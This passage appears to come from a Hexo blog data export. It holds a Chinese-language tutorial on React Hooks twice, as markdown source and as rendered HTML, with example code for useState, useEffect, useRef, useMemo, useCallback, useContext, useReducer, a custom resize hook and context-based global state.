会触发重渲染，并使用最新传递给 `MyContext provider` 的 `context` **value** 值\n\n\n## 7. useReducer\n\n```js\nconst [state, dispatch] = useReducer(reducer, initialArg, init);\n```\n\n在某些场景下，useReducer 会比 useState 更适用，例如 state 逻辑较复杂且包含多个子值，或者下一个 state 依赖于之前的 state 等。并且，使用 useReducer 还能给那些会触发深更新的组件做性能优化，因为你可以向子组件传递 dispatch 而不是回调函数 \n\n> React 会确保 dispatch 函数的标识是稳定的，并且不会在组件重新渲染时改变。这就是为什么可以安全地从 useEffect 或 useCallback 的依赖列表中省略 dispatch\n\n\n```js\nconst reducer =(state = 0, {type})=>{\n    switch (type) {\n        case 'add':\n            return state+1\n        case 'delete':\n            return state-1\n        default:\n            return state;\n    }\n}\n\nconst Hook =()=>{\n    const [count, dispatch] = useReducer(reducer, 0)\n    return(\n        <div>\n           count:{count}\n           <button onClick={()=> dispatch({type:'add'})}>add</button>\n            <button onClick={()=> dispatch({type:'delete'})}>delete</button>\n        </div>\n    )\n}\n\nexport default Hook\n```\n\n\n## 8. 自定义 hooks\n\n**当触发 resize 事件时，自动更新 width、height**\n```js\nimport { useEffect, useState } from 'react';\n\nexport const useWindowSize = () => {\n\tconst [width, setWidth] = useState()\n\tconst [height, setHeight] = useState()\n\n\tuseEffect(() => {\n\t\tconst { clientWidth, clientHeight } = document.documentElement\n\t\tsetWidth(clientWidth)\n\t\tsetHeight(clientHeight)\n\t}, [])\n\n\tuseEffect(() => {\n\t\tconst handleWindowSize = () => {\n\t\t\tconst { clientWidth, clientHeight } = document.documentElement\n\t\t\tsetWidth(clientWidth)\n\t\t\tsetHeight(clientHeight)\n\t\t};\n\n\t\twindow.addEventListener('resize', handleWindowSize, false)\n\n\t\treturn () => {\n\t\t\twindow.removeEventListener('resize', handleWindowSize, false)\n\t\t}\n\t})\n\n\treturn { width, height }\n}\n```\n\n\n## 9. 全局状态管理（useContext + useReducer）\n\n1. 定义 `reducer` 函数、初始 `state` 值，通过 `useReducer(reducer, state)` 生成 `state` 和 `dispatch`\n2. 父组件通过 `<Context.Provider>` 将 `state` 数据、`dispatch` 函数提供给 context\n3. 子孙组件通过 `useContext()` 获取到 `state`、`dispatch`\n4. 子孙组件通过 `state` 数据绑定到 VNode、触发事件时调用 `dispatch` 函数\n\n```js\n// store.js\nimport React, { createContext, useContext, useReducer } from 'react';\n\nconst StoreContext = createContext();\nconst initialState = {count: 0, message: '};\n\nconst reducer = (state, action) => {\n  switch(action.type) {\n    case 'increment':\n      return {\n        count: state.count + 1,\n        message: action.message\n      }\n    case 'decrement':\n      return {\n        count: state.count - 1,\n        message: action.message\n      }\n      case 'reset':\n        return {\n          count: 0,\n          message: action.message\n        }\n    default:\n      throw new Error(`Unhandled action type: ${action.type}`);\n  }\n}\n\nexport const StoreProvider = ({ children }) => {\n  const [state, dispatch] = useReducer(reducer, initialState);\n\n  return (\n    <StoreContext.Provider value={{state, dispatch}}>\n      {children}\n    </StoreContext.Provider>\n  )\n}\n\nexport const useStore = () => useContext(StoreContext);\n```\n\n```js\n// index.js\nimport React from 'react';\nimport ReactDOM from 'react-dom';\nimport { StoreProvider } from './store';\nimport { ChildComponent } from './childComponent';\n\nfunction App() {\n  return (\n    <StoreProvider>\n      <ChildComponent/>\n    </StoreProvider>\n  );\n}\n\nconst rootElement = document.getElementById('root');\nReactDOM.render(<App />, rootElement);\n```\n\n```js\n// childComponent.js\nimport React from 'react';\nimport { useStore } from './store';\n\nexport const ChildComponent = () => {\n  const {state, dispatch} = useStore();\n\n  return (\n    <div>\n      {state.count}\n      <button onClick={() => dispatch({type: 'increment', message:'Incremented'})}>+</button>\n      <button onClick={() => dispatch({type: 'decrement', message: 'Decremented'})}>-</button>\n      <button onClick={() => dispatch({type: 'reset', message: 'Reset'})}>Reset</button>\n      {state.message}\n    </div>\n  )\n}\n```\n\n\n","source":"_posts/React/React Hooks.md","raw":"---\ntitle: React Hooks\ncategories: React\ntags: [React]\ndate: 2021-05-26 16:32:38\n---\n\n# React Hooks\n\nHooks 是辅助 Function Component 的一种工具，用于管理函数组件的状态、生命周期、副作用等\n\n## 1. useState\n\n### 1.1 使用方式\n\n```js\nconst App = () => {\n    const [count, setCount] = useState(0)\n    const [name, setName] = useState('Jack')\n    const [age, setAge] = useState(18)\n\n    const onClick = () => {\n        setCount(count + 1)\n        setAge(age + 1)\n    }\n\n    return (\n        <>\n            <p>You clicked {count} times</p>\n            <p>Your age is {age}</p>\n            <p>Your name is {name}</p>\n            <button onClick={onClick}>\n                Click me\n            </button>\n        </>\n    )\n}\n\nexport default App\n```\n\n在 Class Component 中通过 this.state 方式读取 state，每次执行都会拿到最新的 state 引用，而 Function Component 中不是通过 this. 的方式获取到的 state，而是当时渲染闭包环境的 state 数据，所以取到的值依然是旧的渲染值\n\n说明：每次调用 `setCount`、`setAge` 时都会重新执行整个函数式组件，包括初始化数据，调用 `useState`、`useEffect`，注册事件等，最后返回 `VNode` 对象（每次重新 `render` 组件时取出来的 `state` 是缓存中的值，即上一次 `state` 的值或初始值）\n\n> useState 的初始值只在第一次渲染时有效，之后从 state 中取出的值都是缓存的值\n\n### 1.2 实现原理\n```js\n// useState 基本实现原理\nlet memoizedState = [] // hooks 的值存放在这个数组里\nlet cursor = 0 // 当前 memoizedState 的索引\n\nfunction useState(initialValue) {\n    memoizedState[cursor] = memoizedState[cursor] || initialValue\n    const currentCursor = cursor\n    function setState(newState) {\n        memoizedState[currentCursor] = newState\n        cursor = 0\n        render(<App />, document.getElementById('root'))\n    }\n    return [memoizedState[cursor++], setState] // 返回当前 state，并把 cursor 加 1\n}\n```\n\n**useState 原理**\n* 初次渲染时，每次 `useState` 执行时都会将对应的 `setState` 绑定到对应索引的位置（用于更新指定的 `state`），然后将初始 `state` 存入 `memoizedState` 中\n* 触发 `setCount` 和 `setAge` 时，每个 `setState` 都有其对应索引的引用，因此触发对应的 `setState` 会改变对应位置的 `state` 的值\n* 每次执行 `setState` 都有一次重新渲染的过程，将 `cursor` 重置为 `0`，重新按顺序取得 `state` 里面的值（已缓存上一次 `state` 里的值）\n\n`Hooks` 需要确保 `Hook` 在每一次渲染中都按照同样的顺序被调用，因为 `memoizedState` 是按 `Hooks` 定义的顺序来放置数据的，如果 `Hooks` 的顺序变化，`memoizedState` 并不会感知到。所以最好每次只在最顶层使用 `Hook，不要在循环、条件、嵌套函数中调用` `Hooks。`\n\n\n> `useState` 返回更新 `state` 的函数与 `class` 组件的 `this.setState` 不同，它不会把新的 `state` 和旧的 `state` 进行合并，而是直接替换，相当于直接返回一个新的对象\n\n每次 setState 后都会重新渲染，渲染时的 state、props、useEffect、事件处理函数都是独立的，获取到的值是此次 rerender 时的数据\n\n利用 useRef 就可以绕过 Capture Value 的特性。可以认为 ref 在所有 Render 过程中保持着唯一引用，因此所有对 ref 的赋值或取值，拿到的都只有一个最终状态，而不会在每个 Render 间存在隔离\n\n## 2. useEffect\nuseEffect 在每次 render 执行完后再执行，用于处理数据副操作，用于在函数组件里实现 class 的生命周期\n\n* useEffect(() => {}): 每次 render 后执行，类似于 `componentDidUpdate`\n* useEffect(() => { return cleanUpFn }，[]): 挂载后执行一次，销毁时执行一次 cleanupFn，功能类似于 `componentDidMount` 和 `componentWillUnmount`\n* useEffect(() => {}，[state1, state2]): 每次 state1 或 state2 变化后执行，功能类似于 Vue 中的 `watch`\n\n> 在第一次渲染之后和每次更新之后都会执行，可以根据依赖项进行控制，执行顺序为 `setState` --> `render` --> `useEffect`\n> useEffect 里面使用到的 state 的值, 固定在了 useEffect 内部（闭包环境），引用地址不会再变化\n\n```js\nuseEffect(() => {\n  const timer = setInterval(() => {\n    console.log('---')\n  }, 1000)\n\n  return () => {\n    clearInterval(timer)\n  }\n},[])\n\n```\n\n* 必须将 `函数` 写在 `useEffect` 内部，这样 `eslint-plugin-react-hooks` 才能通过静态分析补齐依赖项\n* 所有函数都写在 useEffect 内部会导致难以维护，可以使用 `useCallback`\n\n```js\nfunction Counter() {\n  const [count, setCount] = useState(0);\n\n  const getFetchUrl = useCallback(() => {\n    return 'https://v?query=' + count;\n  }, [count]);\n\n  useEffect(() => {\n    getFetchUrl();\n  }, [getFetchUrl]);\n\n  return <h1>{count}</h1>;\n}\n```\n\n## 3. useRef\n`useRef` 可以用于访问 DOM 节点、React 组件实例或作为容器保存可变变量\n\n> useRef 返回一个可变的 ref 对象，其 .current 属性被初始化为传入的参数（initialValue）。返回的 ref 对象在组件的整个生命周期内保持不变。通过 current 属性可以访问到 DOM 节点\n\n```js\nfunction TextInputWithFocusButton() {\n  const inputEl = useRef(null);\n  const onButtonClick = () => {\n    inputEl.current.focus(); // `current` 指向已挂载到 DOM 上的文本输入元素\n  };\n  return (\n    <>\n      <input ref={inputEl} type=\"text\" />\n      <button onClick={onButtonClick}>Focus the input</button>\n    </>\n  );\n}\n```\n\n\n```js\n// 获取上一轮的 props 或 state\nfunction usePrevious(value) {\n  const ref = useRef(); // 此处的 ref 相当于是全局变量，re-render 时并不会被回收\n  useEffect(() => {\n    ref.current = value;\n  });\n  return ref.current;\n}\n```\n\n\n## 4.useMemo\n用于缓存值，避免在每次渲染时都进行高开销的计算\n\n`const memoizedValue = useMemo(() => computeExpensiveValue(a, b), [a, b]);`\n\n用于缓存值，把 “创建” 函数和依赖项数组作为参数传入 `useMemo`，它仅会在某个依赖项改变时才重新计算 `memoized` 值。这种优化有助于避免在每次渲染时都进行高开销的计算。类似于 Vue 中的 `computed` 属性。\n\n> 函数组件里的某一个 state 变化时，都会重新执行整个函数并渲染，逻辑从上到下重新执行一遍\n\n```js\nexport default function WithMemo() {\n\tconst [count, setCount] = useState(1);\n\tconst [val, setValue] = useState('');\n\n\t// 缓存了昂贵的计算\n\tconst expensive = useMemo(() => {\n\t\tconsole.log('compute');\n\t\tlet sum = 0;\n\t\tfor (let i = 0; i < count * 100; i++) {\n\t\t\tsum += i;\n\t\t}\n\t\treturn sum;\n\t}, [count]);\n\n\treturn (\n\t\t<div>\n\t\t\t<h4>{count}-{expensive}</h4>\n\t\t\t<div>\n\t\t\t\t<button onClick={() => setCount(count + 1)}>+c1</button>            <input value={val} onChange={event => setValue(event.target.value)} />\n\t\t\t</div>\n\t\t</div>\n\t);\n}\n```\n\n## 5. useCallback\n\n`const memoizedCb = useMemo(() => doSomething(a, b), [a, b]);`\n\n用于**缓存函数**，返回一个 memoized 回调函数，根据依赖项来决定是否更新函数\n\n在 class component 中通过 shouldComponentUpdate 或 getDerivedStateFromProps 中判断前后的 props 和 state，如果没有变化，则阻止更新，而 16.8 版本前的 function component 没有生命周期钩子用来优化性能，且函数组件每次调用都会执行其内部环境的所有逻辑，因此用 useMemo 和 useCallback 处理优化性能问题。\n\n> 把内联回调函数及依赖项数组作为参数传入 useCallback，它将返回该回调函数的 memoized 版本，该回调函数仅在某个依赖项改变时才会更新。当你把回调函数传递给经过优化的并使用引用相等性去避免非必要渲染（例如 shouldComponentUpdate）的子组件时，它将非常有用。\n\n\n> React.memo 为高阶组件。它与 React.PureComponent 非常相似，但只适用于函数组件，而不适用 class 组件，能对props做浅比较，防止组件无效的重复渲染\n\n有一个父组件，其中包含子组件，子组件接收一个函数作为 props；通常而言，如果父组件更新了，子组件也会执行更新；但是大多数场景下，更新是没有必要的，我们可以借助useCallback来返回函数，然后把这个函数作为props传递给子组件；这样，子组件就能避免不必要的更新。\n\n例如：父组件传递一个函数给子组件的时候，由于父组件的更新会导致该函数重新生成从而传递给子组件的函数引用发生了变化，这就会导致子组件也会更新，而很多时候子组件的更新是没必要的，所以我们可以通过 `useCallback` 来缓存该函数，然后传递给子组件，用于减少子组件不必要的重新渲染。\n\n**note:** useCallback 需与 memo 结合使用，否则没有意义\n\n\n```js\nfunction useFetch(count, step) {\n  return useCallback(() => {\n    const url = \"https://v/search?query=\" + count + \"&step=\" + step;\n  }, [count, step]);\n}\n```\n\n```js\n// 父组件\nconst Parent = () => {\n\tconst [count, setCount] = useState(1);\n\tconst [val, setVal] = useState('');\n\tconst callback = useCallback(() => {\n\t\treturn count;\n\t}, [count]);\n\n\treturn (\n\t\t<div>\n\t\t\t<h4>{count}</h4>\n\t\t\t<Child callback={callback} />\n\t\t\t<div>\n\t\t\t\t<button onClick={() => setCount(count + 1)}>+</button>\n\t\t\t\t<input value={val} onChange={event => setVal(event.target.value)} />\n\t\t\t</div>\n\t\t</div>\n\t);\n}\n\n// 子组件\nconst Child = ({ callback }) => {\n\tconst [count, setCount] = useState(() => callback());\n\tuseEffect(() => {\n\t\tsetCount(callback());\n\t}, [callback]);\n\treturn <div>{count}</div>\n}\nexport default React.memo(Child) // 用React.memo包裹\n```\n\n### 5.1 何时使用 useMemo、useCallback\n* 需要保持对象、函数的引用地址相等（核心）\n* 对于组件内部用到的 object、array、函数等，如果用在了其他 Hook 的依赖数组中，或者作为 props 传递给了下游组件，应该使用 useMemo 和 useCallback\n* 自定义 Hook 中暴露出来的 object、array、函数等，都应该使用useMemo 和 useCallback,以确保当值相同时，引用不发生变化\n\nReact.memo 和 React.PureComponent 类似， React.PureComponent 在类组件中使用，而 React.memo 在函数组件中使用\n\n```js\n// 父组件\nconst Parent = () => {\n\tconst [count, setCount] = useState(1);\n\tconst [val, setVal] = useState('');\n\tconst callback = useCallback(() => {\n\t\treturn count;\n\t}, [count]);\n\n\treturn (\n\t\t<div>\n\t\t\t<h4>{count}</h4>\n\t\t\t<Child callback={callback} />\n\t\t\t<div>\n\t\t\t\t<button onClick={() => setCount(count + 1)}>+</button>\n\t\t\t\t<input value={val} onChange={event => setVal(event.target.value)} />\n\t\t\t</div>\n\t\t</div>\n\t);\n}\n\n// 子组件\nconst Child = ({ callback }) => {\n\tconst [count, setCount] = useState(() => callback());\n\tuseEffect(() => {\n\t\tsetCount(callback());\n\t}, [callback]);\n\treturn <div>{count}</div>);\n}\nexport default React.memo(Child)\n\t// 用React.memo包裹\n\n```\n\n\n## 6. useContext\n\n接收一个 `context` 对象（React.createContext 的返回值）并返回该 context 的当前值。\n\n```js\n// initContext 可以为基础数据类型、对象或者函数\nconst context = React.useContext(React.createContext(initContext))\n```\n\n> 当前的 context 值由上层组件中距离当前组件最近的 `<MyContext.Provider>` 的 `value` **prop** 决定，如果 `<MyContext.Provider>` 没有提供 `value` **prop**，则 `context` 中获取到的值为 `React.createContext(initContext)` 中的 `initContext` 值\n\n> 当 `<MyContext.Provider>` 更新时，该 Hook 会触发重渲染，并使用最新传递给 `MyContext provider` 的 `context` **value** 值\n\n\n## 7. useReducer\n\n```js\nconst [state, dispatch] = useReducer(reducer, initialArg, init);\n```\n\n在某些场景下，useReducer 会比 useState 更适用，例如 state 逻辑较复杂且包含多个子值，或者下一个 state 依赖于之前的 state 等。并且，使用 useReducer 还能给那些会触发深更新的组件做性能优化，因为你可以向子组件传递 dispatch 而不是回调函数 \n\n> React 会确保 dispatch 函数的标识是稳定的，并且不会在组件重新渲染时改变。这就是为什么可以安全地从 useEffect 或 useCallback 的依赖列表中省略 dispatch\n\n\n```js\nconst reducer =(state = 0, {type})=>{\n    switch (type) {\n        case 'add':\n            return state+1\n        case 'delete':\n            return state-1\n        default:\n            return state;\n    }\n}\n\nconst Hook =()=>{\n    const [count, dispatch] = useReducer(reducer, 0)\n    return(\n        <div>\n           count:{count}\n           <button onClick={()=> dispatch({type:'add'})}>add</button>\n            <button onClick={()=> dispatch({type:'delete'})}>delete</button>\n        </div>\n    )\n}\n\nexport default Hook\n```\n\n\n## 8. 自定义 hooks\n\n**当触发 resize 事件时，自动更新 width、height**\n```js\nimport { useEffect, useState } from 'react';\n\nexport const useWindowSize = () => {\n\tconst [width, setWidth] = useState()\n\tconst [height, setHeight] = useState()\n\n\tuseEffect(() => {\n\t\tconst { clientWidth, clientHeight } = document.documentElement\n\t\tsetWidth(clientWidth)\n\t\tsetHeight(clientHeight)\n\t}, [])\n\n\tuseEffect(() => {\n\t\tconst handleWindowSize = () => {\n\t\t\tconst { clientWidth, clientHeight } = document.documentElement\n\t\t\tsetWidth(clientWidth)\n\t\t\tsetHeight(clientHeight)\n\t\t};\n\n\t\twindow.addEventListener('resize', handleWindowSize, false)\n\n\t\treturn () => {\n\t\t\twindow.removeEventListener('resize', handleWindowSize, false)\n\t\t}\n\t})\n\n\treturn { width, height }\n}\n```\n\n\n## 9. 全局状态管理（useContext + useReducer）\n\n1. 定义 `reducer` 函数、初始 `state` 值，通过 `useReducer(reducer, state)` 生成 `state` 和 `dispatch`\n2. 父组件通过 `<Context.Provider>` 将 `state` 数据、`dispatch` 函数提供给 context\n3. 子孙组件通过 `useContext()` 获取到 `state`、`dispatch`\n4. 子孙组件通过 `state` 数据绑定到 VNode、触发事件时调用 `dispatch` 函数\n\n```js\n// store.js\nimport React, { createContext, useContext, useReducer } from 'react';\n\nconst StoreContext = createContext();\nconst initialState = {count: 0, message: '};\n\nconst reducer = (state, action) => {\n  switch(action.type) {\n    case 'increment':\n      return {\n        count: state.count + 1,\n        message: action.message\n      }\n    case 'decrement':\n      return {\n        count: state.count - 1,\n        message: action.message\n      }\n      case 'reset':\n        return {\n          count: 0,\n          message: action.message\n        }\n    default:\n      throw new Error(`Unhandled action type: ${action.type}`);\n  }\n}\n\nexport const StoreProvider = ({ children }) => {\n  const [state, dispatch] = useReducer(reducer, initialState);\n\n  return (\n    <StoreContext.Provider value={{state, dispatch}}>\n      {children}\n    </StoreContext.Provider>\n  )\n}\n\nexport const useStore = () => useContext(StoreContext);\n```\n\n```js\n// index.js\nimport React from 'react';\nimport ReactDOM from 'react-dom';\nimport { StoreProvider } from './store';\nimport { ChildComponent } from './childComponent';\n\nfunction App() {\n  return (\n    <StoreProvider>\n      <ChildComponent/>\n    </StoreProvider>\n  );\n}\n\nconst rootElement = document.getElementById('root');\nReactDOM.render(<App />, rootElement);\n```\n\n```js\n// childComponent.js\nimport React from 'react';\nimport { useStore } from './store';\n\nexport const ChildComponent = () => {\n  const {state, dispatch} = useStore();\n\n  return (\n    <div>\n      {state.count}\n      <button onClick={() => dispatch({type: 'increment', message:'Incremented'})}>+</button>\n      <button onClick={() => dispatch({type: 'decrement', message: 'Decremented'})}>-</button>\n      <button onClick={() => dispatch({type: 'reset', message: 'Reset'})}>Reset</button>\n      {state.message}\n    </div>\n  )\n}\n```\n\n\n","slug":"React/React Hooks","published":1,"updated":"2021-06-07T11:46:58.019Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmjxu210000df6r5jiu6xiu","content":"<h1 id=\"React-Hooks\"><a href=\"#React-Hooks\" class=\"headerlink\" title=\"React Hooks\"></a>React Hooks</h1><p>Hooks 是辅助 Function Component 的一种工具，用于管理函数组件的状态、生命周期、副作用等</p>\n<h2 id=\"1-useState\"><a href=\"#1-useState\" class=\"headerlink\" title=\"1. useState\"></a>1. useState</h2><h3 id=\"1-1-使用方式\"><a href=\"#1-1-使用方式\" class=\"headerlink\" title=\"1.1 使用方式\"></a>1.1 使用方式</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> App = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> [count, setCount] = useState(<span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"keyword\">const</span> [name, setName] = useState(<span class=\"string\">&#x27;Jack&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">const</span> [age, setAge] = useState(<span class=\"number\">18</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">const</span> onClick = <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">        setCount(count + <span class=\"number\">1</span>)</span><br><span class=\"line\">        setAge(age + <span class=\"number\">1</span>)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">        &lt;&gt;</span><br><span class=\"line\">            &lt;p&gt;You clicked &#123;count&#125; times&lt;/p&gt;</span><br><span class=\"line\">            &lt;p&gt;Your age is &#123;age&#125;&lt;/p&gt;</span><br><span class=\"line\">            &lt;p&gt;Your name is &#123;name&#125;&lt;/p&gt;</span><br><span class=\"line\">            &lt;button onClick=&#123;onClick&#125;&gt;</span><br><span class=\"line\">                Click me</span><br><span class=\"line\">            &lt;/button&gt;</span><br><span class=\"line\">        &lt;/&gt;</span><br><span class=\"line\">    )</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> App</span><br></pre></td></tr></table></figure>\n\n<p>在 Class Component 中通过 this.state 方式读取 state，每次执行都会拿到最新的 state 引用，而 Function Component 中不是通过 this. 的方式获取到的 state，而是当时渲染闭包环境的 state 数据，所以取到的值依然是旧的渲染值</p>\n<p>说明：每次调用 <code>setCount</code>、<code>setAge</code> 时都会重新执行整个函数式组件，包括初始化数据，调用 <code>useState</code>、<code>useEffect</code>，注册事件等，最后返回 <code>VNode</code> 对象（每次重新 <code>render</code> 组件时取出来的 <code>state</code> 是缓存中的值，即上一次 <code>state</code> 的值或初始值）</p>\n<blockquote>\n<p>useState 的初始值只在第一次渲染时有效，之后从 state 中取出的值都是缓存的值</p>\n</blockquote>\n<h3 id=\"1-2-实现原理\"><a href=\"#1-2-实现原理\" class=\"headerlink\" title=\"1.2 实现原理\"></a>1.2 实现原理</h3><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// useState 基本实现原理</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> memoizedState = [] <span class=\"comment\">// hooks 的值存放在这个数组里</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> cursor = <span class=\"number\">0</span> <span class=\"comment\">// 当前 memoizedState 的索引</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">useState</span>(<span class=\"params\">initialValue</span>) </span>&#123;</span><br><span class=\"line\">    memoizedState[cursor] = memoizedState[cursor] || initialValue</span><br><span class=\"line\">    <span class=\"keyword\">const</span> currentCursor = cursor</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">setState</span>(<span class=\"params\">newState</span>) </span>&#123;</span><br><span class=\"line\">        memoizedState[currentCursor] = newState</span><br><span class=\"line\">        cursor = <span class=\"number\">0</span></span><br><span class=\"line\">        render(<span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">App</span> /&gt;</span></span>, <span class=\"built_in\">document</span>.getElementById(<span class=\"string\">&#x27;root&#x27;</span>))</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [memoizedState[cursor++], setState] <span class=\"comment\">// 返回当前 state，并把 cursor 加 1</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>useState 原理</strong></p>\n<ul>\n<li>初次渲染时，每次 <code>useState</code> 执行时都会将对应的 <code>setState</code> 绑定到对应索引的位置（用于更新指定的 <code>state</code>），然后将初始 <code>state</code> 存入 <code>memoizedState</code> 中</li>\n<li>触发 <code>setCount</code> 和 <code>setAge</code> 时，每个 <code>setState</code> 都有其对应索引的引用，因此触发对应的 <code>setState</code> 会改变对应位置的 <code>state</code> 的值</li>\n<li>每次执行 <code>setState</code> 都有一次重新渲染的过程，将 <code>cursor</code> 重置为 <code>0</code>，重新按顺序取得 <code>state</code> 里面的值（已缓存上一次 <code>state</code> 里的值）</li>\n</ul>\n<p><code>Hooks</code> 需要确保 <code>Hook</code> 在每一次渲染中都按照同样的顺序被调用，因为 <code>memoizedState</code> 是按 <code>Hooks</code> 定义的顺序来放置数据的，如果 <code>Hooks</code> 的顺序变化，<code>memoizedState</code> 并不会感知到。所以最好每次只在最顶层使用 <code>Hook，不要在循环、条件、嵌套函数中调用</code> <code>Hooks。</code></p>\n<blockquote>\n<p><code>useState</code> 返回更新 <code>state</code> 的函数与 <code>class</code> 组件的 <code>this.setState</code> 不同，它不会把新的 <code>state</code> 和旧的 <code>state</code> 进行合并，而是直接替换，相当于直接返回一个新的对象</p>\n</blockquote>\n<p>每次 setState 后都会重新渲染，渲染时的 state、props、useEffect、事件处理函数都是独立的，获取到的值是此次 rerender 时的数据</p>\n<p>利用 useRef 就可以绕过 Capture Value 的特性。可以认为 ref 在所有 Render 过程中保持着唯一引用，因此所有对 ref 的赋值或取值，拿到的都只有一个最终状态，而不会在每个 Render 间存在隔离</p>\n<h2 id=\"2-useEffect\"><a href=\"#2-useEffect\" class=\"headerlink\" title=\"2. useEffect\"></a>2. useEffect</h2><p>useEffect 在每次 render 执行完后再执行，用于处理数据副操作，用于在函数组件里实现 class 的生命周期</p>\n<ul>\n<li>useEffect(() =&gt; {}): 每次 render 后执行，类似于 <code>componentDidUpdate</code></li>\n<li>useEffect(() =&gt; { return cleanUpFn }，[]): 挂载后执行一次，销毁时执行一次 cleanupFn，功能类似于 <code>componentDidMount</code> 和 <code>componentWillUnmount</code></li>\n<li>useEffect(() =&gt; {}，[state1, state2]): 每次 state1 或 state2 变化后执行，功能类似于 Vue 中的 <code>watch</code></li>\n</ul>\n<blockquote>\n<p>在第一次渲染之后和每次更新之后都会执行，可以根据依赖项进行控制，执行顺序为 <code>setState</code> –&gt; <code>render</code> –&gt; <code>useEffect</code><br>useEffect 里面使用到的 state 的值, 固定在了 useEffect 内部（闭包环境），引用地址不会再变化</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">useEffect(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> timer = <span class=\"built_in\">setInterval</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;---&#x27;</span>)</span><br><span class=\"line\">  &#125;, <span class=\"number\">1000</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">clearInterval</span>(timer)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;,[])</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>必须将 <code>函数</code> 写在 <code>useEffect</code> 内部，这样 <code>eslint-plugin-react-hooks</code> 才能通过静态分析补齐依赖项</li>\n<li>所有函数都写在 useEffect 内部会导致难以维护，可以使用 <code>useCallback</code></li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Counter</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> [count, setCount] = useState(<span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">const</span> getFetchUrl = useCallback(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"string\">&#x27;https://v?query=&#x27;</span> + count;</span><br><span class=\"line\">  &#125;, [count]);</span><br><span class=\"line\"></span><br><span class=\"line\">  useEffect(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    getFetchUrl();</span><br><span class=\"line\">  &#125;, [getFetchUrl]);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">h1</span>&gt;</span>&#123;count&#125;<span class=\"tag\">&lt;/<span class=\"name\">h1</span>&gt;</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"3-useRef\"><a href=\"#3-useRef\" class=\"headerlink\" title=\"3. useRef\"></a>3. useRef</h2><p><code>useRef</code> 可以用于访问 DOM 节点、React 组件实例或作为容器保存可变变量</p>\n<blockquote>\n<p>useRef 